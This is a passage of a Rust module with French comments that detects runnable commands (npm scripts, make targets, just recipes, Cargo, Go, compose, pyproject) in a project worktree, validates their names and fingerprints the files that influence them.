//! Runners (v0.3, lot 14a) : détection des commandes d'un worktree, repérage
//! des URL locales dans leur sortie, choix du port. Règles pures : les
//! fichiers sont lus par l'appelant (à travers [`RepoView`]), jamais
//! exécutés, et aucune commande ne vient d'ailleurs que d'ici (architecture
//! § 15 : « le démon n'exécute que des commandes construites par lui »).
//!
//! Sources reconnues, à la racine du worktree et dans ses sous-dossiers
//! directs (monodépôts : `app/package.json`…) :
//!
//! - `package.json` : un runner par script (`<gestionnaire> run <nom>`), le
//!   gestionnaire déduit du fichier de verrou (dossier, puis racine) ;
//! - `GNUmakefile` / `makefile` / `Makefile` (celui que `make` prendrait) :
//!   cibles explicites de ce fichier (les cibles des fichiers inclus ne sont
//!   pas proposées) ;
//! - `justfile` (et variantes) : recettes publiques sans paramètre requis ;
//! - `Cargo.toml` : `cargo run` / `test` / `build`, `cargo run -p` des
//!   membres du workspace qui ont un binaire ;
//! - `go.mod` : `go run .` (paquet `main` présent), `go test ./...`,
//!   `go build ./...` ;
//! - `compose.yaml` et variantes : `docker compose up` ;
//! - `pyproject.toml` : scripts déclarés, lancés par l'outil que désigne le
//!   fichier de verrou (`uv`, `poetry`, `pdm`).
//!
//! **Empreinte (lot 15)** : le hachage de **fichiers entiers**, tous ceux
//! qui influencent l'exécution ([`RunnerFile`], module `inputs`) : source,
//! verrou, réglages du gestionnaire, inclusions et imports (de proche en
//! proche), `.env`, Dockerfile… Le corps montré n'est qu'un extrait utile
//! (script et crochets, cible et prérequis, recette et dépendances), précédé
//! de la liste de ces fichiers. Non couverts : le code compilé (Cargo, Go,
//! contexte de build), les scripts appelés par un script, les programmes du
//! `PATH`, les fichiers hors du worktree.
//!
//! Un nom qui pourrait passer pour une option (`-…`), contient un caractère
//! de contrôle ou une syntaxe de l'outil (`$`, `%`, `=`…) est écarté : le
//! nom devient un argument de la commande, jamais une option.

use std::collections::{BTreeMap, BTreeSet, HashMap, HashSet};

mod compose;
mod inputs;

use inputs::Inputs;
pub use inputs::{
    FileState, Loaded, MAX_HASH_BYTES, MAX_RUNNER_FILES, MAX_STREAM_HASH_BYTES, RunnerFile,
    parent_dir, resolve_dir, resolve_ref,
};
use std::path::Path;

/// Fichier lu au plus (au-delà : source ignorée).
pub const MAX_SOURCE_BYTES: u64 = 1024 * 1024;
/// Sous-dossiers directs examinés au plus.
pub const MAX_SUBDIRS: usize = 64;
/// Runners détectés au plus.
pub const MAX_RUNNERS: usize = 200;
/// Membres d'un workspace Cargo examinés au plus.
pub const MAX_CARGO_MEMBERS: usize = 64;
/// Runners vivants au plus par session.
pub const MAX_LIVE_PER_SESSION: usize = 8;
/// Plage des ports attribués aux worktrees (`PORT`).
pub const PORT_MIN: u16 = 41_000;
pub const PORT_MAX: u16 = 41_999;
/// URL gardées au plus par processus.
pub const MAX_URLS: usize = 16;
/// Longueur maximale d'un nom de script, de cible ou de recette.
const MAX_NAME_LEN: usize = 200;
/// Ligne de sortie examinée au plus (au-delà, coupée).
const MAX_LINE: usize = 4096;
/// Cibles (make) ou recettes (just) suivies au plus pour une commande.
pub const MAX_DEPENDENCIES: usize = 256;
/// Séquence d'échappement (CSI, OSC, DCS…) lue au plus : au-delà, ou sur
/// CAN / SUB, elle est abandonnée et le texte reprend (une chaîne jamais
/// terminée n'absorbe pas la suite de la sortie).
const MAX_SEQUENCE: usize = 4096;

/// Sous-dossiers jamais examinés (dépendances, sorties de compilation).
const SKIPPED_DIRS: &[&str] = &[
    "node_modules",
    "target",
    "vendor",
    "dist",
    "build",
    "out",
    "venv",
    "__pycache__",
];

/// Type de runner (onglet « Lancer » : regroupement).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum RunnerKind {
    Dev,
    Test,
    Build,
    Lint,
    Other,
}

impl RunnerKind {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Dev => "dev",
            Self::Test => "test",
            Self::Build => "build",
            Self::Lint => "lint",
            Self::Other => "other",
        }
    }
}

/// Une commande détectée.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Runner {
    /// Identifiant stable : la source (`app/package.json:dev`).
    pub id: String,
    pub label: String,
    pub kind: RunnerKind,
    /// Commande (argv) : programme puis arguments, jamais passée à un shell.
    pub command: Vec<String>,
    /// Dossier de lancement, relatif à la racine du worktree (`""` : racine).
    pub cwd: String,
    /// `fichier:clé`.
    pub source: String,
    /// Extrait utile de ce qui va s'exécuter, tel que lu dans la source :
    /// script et crochets (`package.json`, `pyproject.toml`), réglages,
    /// règle et prérequis (Makefile), recette et dépendances (justfile),
    /// fichier compose ; pour Cargo et Go, la commande. Montré précédé de la
    /// liste des fichiers pris en compte ([`Runner::full_body`]).
    pub body: String,
    /// Fichier de verrou qui a choisi l'outil (`pnpm-lock.yaml`…), s'il y en a un.
    pub lock: Option<String>,
    /// **Tous** les fichiers qui influencent l'exécution, hachés : la
    /// matière de l'empreinte.
    pub files: Vec<RunnerFile>,
}

/// Corps montré au plus (octets).
pub const MAX_BODY_SHOWN: usize = 4096;

impl Runner {
    /// Empreinte de ce qui sera lancé : SHA-256 (hexadécimal) du JSON
    /// `[command, cwd, source, [[chemin, état, empreinte], …]]`, fichiers
    /// triés par chemin ([`RunnerFile`] : contenu brut haché en entier, ou
    /// marqueur). Toute modification d'un fichier pris en compte, son
    /// apparition ou sa disparition, ou une autre commande la changent.
    pub fn fingerprint(&self) -> String {
        let mut files: Vec<(&str, &str, &str)> = self
            .files
            .iter()
            .map(|f| (f.path.as_str(), f.state.as_str(), f.digest.as_str()))
            .collect();
        files.sort();
        files.dedup();
        let v = serde_json::json!([self.command, self.cwd, self.source, files]);
        super::files::sha256_hex(v.to_string().as_bytes())
    }

    /// Corps entier : la liste des fichiers pris en compte, puis l'extrait.
    pub fn full_body(&self) -> String {
        if self.files.is_empty() {
            return self.body.clone();
        }
        format!("{}\n\n{}", inputs::files_header(&self.files), self.body)
    }

    /// Corps à montrer (coupé à [`MAX_BODY_SHOWN`] octets, sur une limite de
    /// caractère) et s'il a été coupé.
    pub fn shown_body(&self) -> (String, bool) {
        let mut body = self.full_body();
        if body.len() <= MAX_BODY_SHOWN {
            return (body, false);
        }
        let mut end = MAX_BODY_SHOWN;
        while !body.is_char_boundary(end) {
            end -= 1;
        }
        body.truncate(end);
        (body, true)
    }

    fn with_body(mut self, body: impl Into<String>) -> Self {
        self.body = body.into();
        self
    }

    fn with_lock(mut self, lock: Option<String>) -> Self {
        self.lock = lock;
        self
    }

    fn with_files(mut self, files: &[RunnerFile]) -> Self {
        self.files = files.to_vec();
        self
    }
}

/// Lecture du worktree, confinée à sa racine (implémentée par le démon avec
/// les mêmes garanties que `files.read`). Chemins relatifs à la racine,
/// séparés par `/`, `""` pour la racine.
pub trait RepoView {
    /// Contenu d'un fichier ordinaire (texte UTF-8, [`MAX_SOURCE_BYTES`] au
    /// plus), `None` s'il est absent, trop gros ou illisible. Pour la
    /// détection seulement (code Go, membres Cargo…).
    fn read(&self, rel: &str) -> Option<String>;
    /// Contenu brut d'un fichier pris en compte, [`MAX_HASH_BYTES`] au plus.
    fn load(&self, rel: &str) -> Loaded;
    /// Pour un fichier plus gros que [`MAX_HASH_BYTES`] : SHA-256 de son
    /// contenu lu par blocs, [`MAX_STREAM_HASH_BYTES`] au plus ; `(taille,
    /// empreinte)`, l'empreinte `None` au-delà ; `None` s'il est illisible.
    fn hash_large(&self, rel: &str) -> Option<(u64, Option<String>)>;
    /// Le fichier existe (fichier ordinaire, sans suivre de lien sortant).
    fn is_file(&self, rel: &str) -> bool;
    /// Le dossier existe.
    fn is_dir(&self, rel: &str) -> bool;
    /// Sous-dossiers d'un dossier (noms), triés.
    fn subdirs(&self, rel: &str) -> Vec<String>;
    /// Fichiers ordinaires d'un dossier (noms), triés.
    fn files(&self, rel: &str) -> Vec<String>;
}

fn join(dir: &str, name: &str) -> String {
    if dir.is_empty() {
        name.to_owned()
    } else {
        format!("{dir}/{name}")
    }
}

/// Nom utilisable comme argument : non vide, pas une option, sans caractère
/// de contrôle ni blanc, raisonnablement court.
pub fn safe_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= MAX_NAME_LEN
        && !name.starts_with('-')
        && !name.chars().any(|c| c.is_control() || c.is_whitespace())
}

/// Type d'après le nom (`test:unit` → test, `dev-server` → dev…).
pub fn classify(name: &str) -> RunnerKind {
    let lower = name.to_lowercase();
    let base = lower
        .split([':', '-', '_', '.', '/', ' '])
        .find(|s| !s.is_empty())
        .unwrap_or("");
    let pick = |s: &str| -> Option<RunnerKind> {
        Some(match s {
            "dev" | "develop" | "start" | "serve" | "server" | "watch" | "preview" | "up"
            | "run" | "storybook" => RunnerKind::Dev,
            "test" | "tests" | "e2e" | "spec" | "specs" | "coverage" | "cov" | "jest"
            | "vitest" | "pytest" | "playwright" | "cypress" => RunnerKind::Test,
            "build" | "compile" | "bundle" | "dist" | "package" | "release" => RunnerKind::Build,
            "lint" | "fmt" | "format" | "check" | "typecheck" | "tsc" | "clippy" | "eslint"
            | "prettier" | "stylelint" | "vet" | "ruff" | "mypy" => RunnerKind::Lint,
            _ => return None,
        })
    };
    pick(base)
        .or_else(|| pick(&lower))
        .unwrap_or(RunnerKind::Other)
}

/// Détecte les runners du worktree.
pub fn detect(view: &dyn RepoView) -> Vec<Runner> {
    let mut out = Vec::new();
    let root_cargo = detect_cargo(view, "", &mut out);
    let mut dirs: Vec<String> = view
        .subdirs("")
        .into_iter()
        .filter(|d| !d.starts_with('.') && !SKIPPED_DIRS.contains(&d.as_str()))
        .take(MAX_SUBDIRS)
        .collect();
    dirs.insert(0, String::new());
    for dir in &dirs {
        if !dir.is_empty() && !root_cargo.contains(dir) {
            detect_cargo(view, dir, &mut out);
        }
        detect_package_json(view, dir, &mut out);
        detect_make(view, dir, &mut out);
        detect_just(view, dir, &mut out);
        detect_go(view, dir, &mut out);
        detect_compose(view, dir, &mut out);
        detect_pyproject(view, dir, &mut out);
        if out.len() >= MAX_RUNNERS {
            break;
        }
    }
    // Un identifiant n'apparaît qu'une fois (le premier gagne).
    let mut seen = HashSet::new();
    out.retain(|r| seen.insert(r.id.clone()));
    out.truncate(MAX_RUNNERS);
    out
}

fn runner(
    dir: &str,
    file: &str,
    key: &str,
    label: impl Into<String>,
    kind: RunnerKind,
    command: Vec<&str>,
) -> Runner {
    let source = format!("{}:{key}", join(dir, file));
    let command: Vec<String> = command.into_iter().map(str::to_owned).collect();
    Runner {
        id: source.clone(),
        label: label.into(),
        kind,
        body: command.join(" "),
        command,
        cwd: dir.to_owned(),
        source,
        lock: None,
        files: Vec::new(),
    }
}

// ----------------------------------------------------------------- npm & co

/// Scripts du cycle de vie de npm, lancés par `install`/`publish`… : pas des
/// commandes à proposer.
const NPM_LIFECYCLE: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "prepare",
    "prepublish",
    "prepublishOnly",
    "publish",
    "postpublish",
    "prepack",
    "postpack",
    "preversion",
    "version",
    "postversion",
    "dependencies",
];

/// Gestionnaire de paquets d'après les fichiers de verrou (dossier, puis
/// racine), puis le champ `packageManager` ; `npm` par défaut. Renvoie aussi
/// le verrou qui a décidé.
fn package_manager(
    view: &dyn RepoView,
    dir: &str,
    field: Option<&str>,
) -> (&'static str, Option<String>) {
    let locks: &[(&str, &'static str)] = &[
        ("pnpm-lock.yaml", "pnpm"),
        ("yarn.lock", "yarn"),
        ("bun.lockb", "bun"),
        ("bun.lock", "bun"),
        ("package-lock.json", "npm"),
        ("npm-shrinkwrap.json", "npm"),
    ];
    let mut dirs = vec![dir];
    if !dir.is_empty() {
        dirs.push("");
    }
    for d in dirs {
        for (file, pm) in locks {
            let lock = join(d, file);
            if view.is_file(&lock) {
                return (pm, Some(lock));
            }
        }
    }
    let pm = match field.and_then(|f| f.split('@').next()) {
        Some("pnpm") => "pnpm",
        Some("yarn") => "yarn",
        Some("bun") => "bun",
        _ => "npm",
    };
    (pm, None)
}

fn detect_package_json(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
    let mut inputs = Inputs::new(view);
    let Some(text) = inputs.file_if_present(&join(dir, "package.json"), "source") else {
        return;
    };
    let Ok(v) = serde_json::from_str::<serde_json::Value>(&text) else {
        return;
    };
    let Some(scripts) = v.get("scripts").and_then(|s| s.as_object()) else {
        return;
    };
    let (pm, lock) = package_manager(
        view,
        dir,
        v.get("packageManager").and_then(serde_json::Value::as_str),
    );
    if let Some(l) = &lock {
        inputs.file(l, "fichier de verrou");
    }
    // Réglages du gestionnaire lus dans le dépôt (`script-shell`,
    // `ignore-scripts`…) : listés même absents (leur apparition compte).
    let configs: &[&str] = match pm {
        "yarn" => &[".yarnrc.yml", ".yarnrc", ".npmrc"],
        "bun" => &["bunfig.toml", ".npmrc"],
        _ => &[".npmrc"],
    };
    let mut config_dirs = vec![dir];
    if !dir.is_empty() {
        config_dirs.push("");
    }
    for d in config_dirs {
        for c in configs {
            inputs.file(&join(d, c), "réglages du gestionnaire");
        }
    }
    let files = inputs.into_files();
    for (name, body) in scripts {
        let Some(body) = body.as_str() else {
            continue;
        };
        if !safe_name(name) || NPM_LIFECYCLE.contains(&name.as_str()) {
            continue;
        }
        // `predev` / `postdev` : crochets de `dev`, lancés avec lui.
        let hook = ["pre", "post"].iter().any(|p| {
            name.strip_prefix(p)
                .is_some_and(|base| !base.is_empty() && scripts.contains_key(base))
        });
        if hook {
            continue;
        }
        out.push(
            runner(
                dir,
                "package.json",
                name,
                name.clone(),
                classify(name),
                vec![pm, "run", name],
            )
            .with_body(script_body(scripts, name, body))
            .with_lock(lock.clone())
            .with_files(&files),
        );
    }
}

/// Corps d'un script avec ses crochets : `pre<nom>` et `post<nom>` sont
/// lancés avec lui par npm, pnpm (`enable-pre-post-scripts`, vrai par
/// défaut), bun et yarn 1 (pas par yarn 2 et suivants : montrés quand même,
/// dans le doute). Sans crochet : le corps seul ; sinon
/// `[pre<nom>] …` / `[<nom>] …` / `[post<nom>] …`.
fn script_body(
    scripts: &serde_json::Map<String, serde_json::Value>,
    name: &str,
    body: &str,
) -> String {
    let hook = |prefix: &str| {
        let key = format!("{prefix}{name}");
        scripts
            .get(&key)
            .and_then(serde_json::Value::as_str)
            .map(|b| format!("[{key}] {b}"))
    };
    let (pre, post) = (hook("pre"), hook("post"));
    if pre.is_none() && post.is_none() {
        return body.to_owned();
    }
    pre.into_iter()
        .chain(std::iter::once(format!("[{name}] {body}")))
        .chain(post)
        .collect::<Vec<_>>()
        .join("\n")
}

// --------------------------------------------------------------------- make

/// Cibles explicites d'un Makefile : ni cibles spéciales (`.PHONY`…), ni
/// motifs (`%`), ni variables (`$`), ni fichiers (`/`, ou `.` sans être
/// déclarée `.PHONY`). Les inclusions ne sont pas suivies, les recettes et
/// les blocs `define` sont sautés.
pub fn make_targets(text: &str) -> Vec<String> {
    make_rules(text).into_iter().map(|(n, _)| n).collect()
}

/// Cibles de [`make_targets`] avec leur corps : chaque ligne de règle qui
/// les définit, suivie de ses lignes de recette.
pub fn make_rules(text: &str) -> Vec<(String, String)> {
    let parsed = parse_make(text);
    parsed
        .rules
        .into_iter()
        .filter(|r| {
            let name = r.name.as_str();
            safe_name(name)
                && !name.starts_with('.')
                && !name.contains(['$', '%', '(', ')', '=', '\\', '/', '"', '\'', '*', '?'])
                && (!name.contains('.') || parsed.phony.contains(name))
        })
        .map(|r| (r.name, r.lines.join("\n")))
        .collect()
}

/// Règle explicite d'un Makefile (une cible, toutes ses lignes de règle).
struct MakeRule {
    name: String,
    /// Prérequis, normaux puis d'ordre (`|`), dans l'ordre d'écriture.
    prereqs: Vec<String>,
    /// Lignes de règle et de recette.
    lines: Vec<String>,
}

/// Lecture d'un Makefile : toutes les cibles explicites nommées (fichiers
/// compris, sans motif ni variable ni cible spéciale `.XXX`), cibles
/// `.PHONY`, fichiers inclus tels qu'écrits.
struct MakeParse {
    rules: Vec<MakeRule>,
    phony: HashSet<String>,
    includes: Vec<String>,
    /// Lignes de réglage qui changent toute exécution (`SHELL`,
    /// `.ONESHELL`, `.SHELLFLAGS`, `export`…), telles qu'écrites.
    settings: Vec<String>,
    /// Le fichier a des règles à motif (`%`) : non suivies.
    patterns: bool,
}

/// Ligne de réglage global d'un Makefile (montrée avec chaque cible).
fn make_setting(trimmed: &str) -> bool {
    let t = trimmed
        .strip_prefix("override ")
        .unwrap_or(trimmed)
        .trim_start();
    let named = |n: &str| {
        t.strip_prefix(n)
            .is_some_and(|r| r.is_empty() || r.starts_with([' ', '\t', ':', '=', '?', '+', '!']))
    };
    [
        "SHELL",
        ".SHELLFLAGS",
        ".ONESHELL",
        ".POSIX",
        ".EXPORT_ALL_VARIABLES",
        "MAKEFLAGS",
    ]
    .iter()
    .any(|n| named(n))
        || t.starts_with("export ")
        || t == "export"
        || t.starts_with("unexport ")
}

fn parse_make(text: &str) -> MakeParse {
    let mut lines: Vec<String> = Vec::new();
    let mut cur = String::new();
    for raw in text.lines() {
        if let Some(stripped) = raw.strip_suffix('\\') {
            cur.push_str(stripped);
            cur.push(' ');
            continue;
        }
        cur.push_str(raw);
        lines.push(std::mem::take(&mut cur));
    }
    if !cur.is_empty() {
        lines.push(cur);
    }
    let mut rules: Vec<MakeRule> = Vec::new();
    let mut phony: HashSet<String> = HashSet::new();
    let mut includes: Vec<String> = Vec::new();
    let mut settings: Vec<String> = Vec::new();
    let mut patterns = false;
    let mut in_define = 0usize;
    // Cibles de la dernière règle (reçoivent les lignes de recette).
    let mut current: Vec<usize> = Vec::new();
    for full in &lines {
        if full.starts_with('\t') {
            if in_define == 0 {
                for &i in &current {
                    rules[i].lines.push(full.clone());
                }
            }
            continue; // recette
        }
        let line = match full.find('#') {
            Some(i) => &full[..i],
            None => full.as_str(),
        };
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue; // ligne vide ou commentaire : la recette continue
        }
        current.clear();
        let first = trimmed.split_whitespace().next().unwrap_or("");
        let after_directive = |kw: &str| first == kw;
        if after_directive("define")
            || ["override", "export"]
                .iter()
                .any(|k| first == *k && trimmed.split_whitespace().nth(1) == Some("define"))
        {
            in_define += 1;
            continue;
        }
        if after_directive("endef") {
            in_define = in_define.saturating_sub(1);
            continue;
        }
        if in_define > 0 || trimmed.is_empty() {
            continue;
        }
        if make_setting(trimmed) {
            settings.push(full.trim_end().to_owned());
        }
        if ["include", "-include", "sinclude"].contains(&first) {
            includes.extend(trimmed.split_whitespace().skip(1).map(str::to_owned));
            continue;
        }
        if [
            "export", "unexport", "override", "vpath", "ifeq", "ifneq", "ifdef", "ifndef", "else",
            "endif", "undefine", "private", "load",
        ]
        .contains(&first)
        {
            continue;
        }
        // Premier `:` qui n'introduit pas une affectation.
        let Some(colon) = trimmed.find(':') else {
            continue;
        };
        if trimmed[..colon].contains('=') {
            continue; // affectation (`A = b:c`)
        }
        let mut rest = &trimmed[colon + 1..];
        if rest.starts_with(':') {
            rest = &rest[1..];
            if rest.starts_with(':') {
                rest = &rest[1..];
            }
        }
        if rest.starts_with('=') {
            continue; // `:=`, `::=`, `:::=`
        }
        let recipe_cut = rest.find(';').map_or(rest, |i| &rest[..i]);
        let names_part = trimmed[..colon].trim().trim_end_matches('&').trim();
        if names_part == ".PHONY" {
            phony.extend(recipe_cut.split_whitespace().map(str::to_owned));
            continue;
        }
        if recipe_cut.contains('=') {
            continue; // variable propre à une cible (`t: X = 1`)
        }
        // Règle à motif statique (`objs: %.o: %.c`) : prérequis non suivis.
        let prereqs: Vec<String> = if recipe_cut.contains(':') {
            Vec::new()
        } else {
            recipe_cut
                .split_whitespace()
                .filter(|p| *p != "|")
                .map(str::to_owned)
                .collect()
        };
        for name in names_part.split_whitespace() {
            let special = name
                .strip_prefix('.')
                .is_some_and(|r| r.starts_with(|c: char| c.is_ascii_uppercase()));
            if name.contains('%') {
                patterns = true;
            }
            if special || name.contains(['$', '%']) {
                continue;
            }
            let i = match rules.iter().position(|r| r.name == name) {
                Some(i) => i,
                None => {
                    rules.push(MakeRule {
                        name: name.to_owned(),
                        prereqs: Vec::new(),
                        lines: Vec::new(),
                    });
                    rules.len() - 1
                }
            };
            for p in &prereqs {
                if !rules[i].prereqs.contains(p) {
                    rules[i].prereqs.push(p.clone());
                }
            }
            rules[i].lines.push(full.trim_end().to_owned());
            current.push(i);
        }
    }
    MakeParse {
        rules,
        phony,
        includes,
        settings,
        patterns,
    }
}

/// Corps de `make <cible>` : les règles et recettes des prérequis
/// (transitivement, ceux définis dans ce fichier), dans l'ordre où make les
/// construit (prérequis d'abord, de gauche à droite), puis celles de la
/// cible ; chaque cible une fois (cycle sans fin impossible),
/// [`MAX_DEPENDENCIES`] au plus.
fn make_body(parsed: &MakeParse, target: &str) -> String {
    let index: HashMap<&str, usize> = parsed
        .rules
        .iter()
        .enumerate()
        .map(|(i, r)| (r.name.as_str(), i))
        .collect();
    let mut seen: HashSet<usize> = HashSet::new();
    let mut blocks: Vec<String> = Vec::new();
    let mut cut = false;
    // Parcours en profondeur sans récursion : (règle, prérequis déjà vus).
    let Some(&start) = index.get(target) else {
        return String::new();
    };
    seen.insert(start);
    let mut stack: Vec<(usize, usize)> = vec![(start, 0)];
    while let Some((i, k)) = stack.pop() {
        let rule = &parsed.rules[i];
        if let Some(p) = rule.prereqs.get(k) {
            stack.push((i, k + 1));
            if let Some(&j) = index.get(p.as_str())
                && !seen.contains(&j)
            {
                if seen.len() >= MAX_DEPENDENCIES {
                    cut = true;
                    continue;
                }
                seen.insert(j);
                stack.push((j, 0));
            }
            continue;
        }
        blocks.push(rule.lines.join("\n"));
    }
    if cut {
        blocks.push(format!(
            "# … prérequis au-delà de {MAX_DEPENDENCIES} non montrés"
        ));
    }
    // Ce que ce parcours ne suit pas : dit, le fichier entier reste pris en compte.
    let mut unfollowed: Vec<&str> = seen
        .iter()
        .flat_map(|&i| parsed.rules[i].prereqs.iter())
        .filter(|p| p.contains('$'))
        .map(String::as_str)
        .collect();
    unfollowed.sort_unstable();
    unfollowed.dedup();
    if !unfollowed.is_empty() {
        blocks.push(format!(
            "# prérequis à variable non suivis : {}",
            unfollowed.join(" ")
        ));
    }
    if parsed.patterns {
        blocks.push("# règles à motif (%) non suivies".into());
    }
    let mut out = String::new();
    if !parsed.settings.is_empty() {
        out.push_str(&parsed.settings.join("\n"));
        out.push_str("\n\n");
    }
    out.push_str(&blocks.join("\n"));
    out
}

/// Prend en compte les fichiers inclus d'un Makefile (relatifs au dossier
/// de lancement de make, `dir`), et ceux qu'ils incluent, lus jusqu'à
/// [`MAX_HASH_BYTES`].
fn make_includes(inputs: &mut Inputs<'_>, dir: &str, includes: &[String]) {
    for w in includes {
        if let Some(text) = inputs.reference(dir, w, "inclus (include)") {
            make_includes(inputs, dir, &parse_make(&text).includes);
        }
    }
}

fn detect_make(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
    // L'ordre de recherche de GNU make : seul le premier compte ; ceux
    // d'avant sont pris en compte absents (leur apparition change tout).
    let mut inputs = Inputs::new(view);
    let mut found = None;
    for f in ["GNUmakefile", "makefile", "Makefile"] {
        let path = join(dir, f);
        if matches!(view.load(&path), Loaded::Absent(_)) {
            inputs.file(&path, "Makefile prioritaire, s'il apparaît");
            continue;
        }
        found = inputs.file(&path, "source").map(|t| (f, t));
        break;
    }
    let Some((file, text)) = found else {
        return;
    };
    let parsed = parse_make(&text);
    make_includes(&mut inputs, dir, &parsed.includes);
    let files = inputs.into_files();
    for (t, _) in make_rules(&text) {
        out.push(
            runner(dir, file, &t, t.clone(), classify(&t), vec!["make", &t])
                .with_body(make_body(&parsed, &t))
                .with_files(&files),
        );
    }
}

// --------------------------------------------------------------------- just

/// Recettes d'un justfile lançables sans argument : publiques (ni `_…` ni
/// `[private]`), sans paramètre requis (un paramètre avec valeur par défaut
/// ou `*variadique` est accepté).
pub fn just_recipes(text: &str) -> Vec<String> {
    just_rules(text).into_iter().map(|(n, _)| n).collect()
}

/// Recettes de [`just_recipes`] avec leur corps : l'en-tête et ses lignes
/// indentées.
pub fn just_rules(text: &str) -> Vec<(String, String)> {
    parse_just(text)
        .recipes
        .into_iter()
        .filter(|r| r.offered)
        .map(|r| (r.name, r.body))
        .collect()
}

/// Recette d'un justfile (toutes, privées comprises : dépendances possibles).
struct JustRecipe {
    name: String,
    /// En-tête et lignes indentées.
    body: String,
    /// Dépendances lancées avant (`a: b c`), puis après (`a: b && c`).
    before: Vec<String>,
    after: Vec<String>,
    /// Proposée comme runner (publique, sans paramètre requis, nom sûr).
    offered: bool,
}

/// Lecture d'un justfile : recettes, et fichiers importés tels qu'écrits
/// (`import 'f'`, `import? 'f'`, `mod nom ['f']`, `mod? nom ['f']`).
struct JustParse {
    recipes: Vec<JustRecipe>,
    /// `(genre, nom de module ou None, chemin écrit ou None)`.
    imports: Vec<(&'static str, Option<String>, Option<String>)>,
    /// Lignes `set …` et `export …`, telles qu'écrites (montrées avec
    /// chaque recette : `set shell`, `set dotenv-load`…).
    settings: Vec<String>,
    /// `.env` chargé (`set dotenv-load`, ou `dotenv-filename` /
    /// `dotenv-path` donnés) : `(nom de fichier, chemin imposé)`.
    dotenv: Option<(String, Option<String>)>,
}

/// Réglage `set <nom> [:= valeur]` d'un justfile : `(nom, valeur)`.
fn just_setting(t: &str) -> Option<(&str, Option<String>)> {
    let rest = t.strip_prefix("set ")?.trim();
    let (name, value) = match rest.split_once(":=") {
        Some((n, v)) => (n.trim(), Some(v.trim())),
        None => (rest, None),
    };
    let value = value.map(|v| unquote(v).unwrap_or_else(|| v.to_owned()));
    Some((name, value))
}

/// Texte entre guillemets simples ou doubles (sans échappement interprété).
fn unquote(s: &str) -> Option<String> {
    let s = s.trim();
    let q = s.chars().next()?;
    if !matches!(q, '\'' | '"') || s.len() < 2 || !s.ends_with(q) {
        return None;
    }
    Some(s[1..s.len() - 1].to_owned())
}

/// Dépendances d'un en-tête de recette (texte après le `:`) : noms, ou
/// `(nom arguments…)` ; `&&` sépare celles d'avant et celles d'après.
fn just_deps(rest: &str) -> (Vec<String>, Vec<String>) {
    let chars: Vec<char> = rest.chars().collect();
    let (mut before, mut after) = (Vec::new(), Vec::new());
    let mut later = false;
    let mut i = 0;
    let word = |chars: &[char], mut i: usize| {
        let start = i;
        while i < chars.len()
            && (chars[i].is_ascii_alphanumeric() || chars[i] == '_' || chars[i] == '-')
        {
            i += 1;
        }
        (chars[start..i].iter().collect::<String>(), i)
    };
    while i < chars.len() {
        let c = chars[i];
        if c.is_whitespace() {
            i += 1;
        } else if c == '&' && chars.get(i + 1) == Some(&'&') {
            later = true;
            i += 2;
        } else if c == '(' {
            let mut j = i + 1;
            while j < chars.len() && chars[j].is_whitespace() {
                j += 1;
            }
            let (name, _) = word(&chars, j);
            // Fin de la parenthèse (guillemets respectés).
            let Some(end) = skip_just_value(&chars, i) else {
                break;
            };
            if !name.is_empty() {
                if later { &mut after } else { &mut before }.push(name);
            }
            i = end;
        } else {
            let (name, j) = word(&chars, i);
            if name.is_empty() {
                break; // commentaire ou syntaxe inconnue
            }
            if later { &mut after } else { &mut before }.push(name);
            i = j;
        }
    }
    (before, after)
}

fn parse_just(text: &str) -> JustParse {
    let all: Vec<&str> = text.lines().collect();
    let mut recipes: Vec<JustRecipe> = Vec::new();
    let mut imports = Vec::new();
    let mut settings = Vec::new();
    let mut dotenv: Option<(String, Option<String>)> = None;
    let mut dotenv_set = false;
    let mut private_next = false;
    for (idx, line) in all.iter().enumerate() {
        let line = *line;
        if line.starts_with([' ', '\t']) || line.trim().is_empty() {
            continue; // corps de recette
        }
        let t = line.trim_end();
        if t.starts_with('#') {
            continue;
        }
        if let Some(attrs) = t.strip_prefix('[') {
            if attrs.split([',', ']']).any(|a| a.trim() == "private") {
                private_next = true;
            }
            continue;
        }
        let private = std::mem::take(&mut private_next);
        let first = t.split_whitespace().next().unwrap_or("");
        if matches!(first, "import" | "import?") && t.len() > first.len() {
            imports.push(("import", None, unquote(&t[first.len()..])));
            continue;
        }
        if matches!(first, "mod" | "mod?") && t.len() > first.len() {
            let rest = t[first.len()..].trim();
            let (name, path) = match rest.split_once(char::is_whitespace) {
                Some((n, p)) => (n, unquote(p)),
                None => (rest, None),
            };
            imports.push(("mod", Some(name.to_owned()), path));
            continue;
        }
        if ["set", "export", "unexport"].contains(&first) && t.len() > first.len() {
            settings.push(t.to_owned());
            if let Some((name, value)) = just_setting(t) {
                let on = value.as_deref().is_none_or(|v| v == "true");
                let (mut file, mut path) = dotenv.take().unwrap_or((".env".to_owned(), None));
                let mut load = dotenv_set;
                match name {
                    "dotenv-load" => load = on,
                    "dotenv-filename" => {
                        if let Some(v) = value {
                            file = v;
                        }
                        load = true;
                    }
                    "dotenv-path" => {
                        path = value;
                        load = true;
                    }
                    _ => {}
                }
                dotenv_set = load;
                dotenv = Some((file, path));
            }
            continue;
        }
        if first == "alias" && t.len() > first.len() {
            continue;
        }
        let body = t.strip_prefix('@').unwrap_or(t);
        let name_len = body
            .char_indices()
            .find(|(i, c)| !(c.is_ascii_alphanumeric() || *c == '_' || (*c == '-' && *i > 0)))
            .map_or(body.len(), |(i, _)| i);
        let name = &body[..name_len];
        if name.is_empty() || name.starts_with(|c: char| c.is_ascii_digit()) {
            continue;
        }
        let rest = &body[name_len..];
        if rest.trim_start().starts_with(":=") {
            continue; // affectation
        }
        let Some((params, deps)) = just_params(rest) else {
            continue;
        };
        if recipes.iter().any(|r| r.name == name) {
            continue;
        }
        let offered = !(private
            || name.starts_with('_')
            || !safe_name(name)
            || params.iter().any(|p| p.required));
        let mut lines = vec![t];
        for next in &all[idx + 1..] {
            if !(next.starts_with([' ', '\t']) || next.trim().is_empty()) {
                break;
            }
            lines.push(next.trim_end());
        }
        while lines.last().is_some_and(|l| l.is_empty()) {
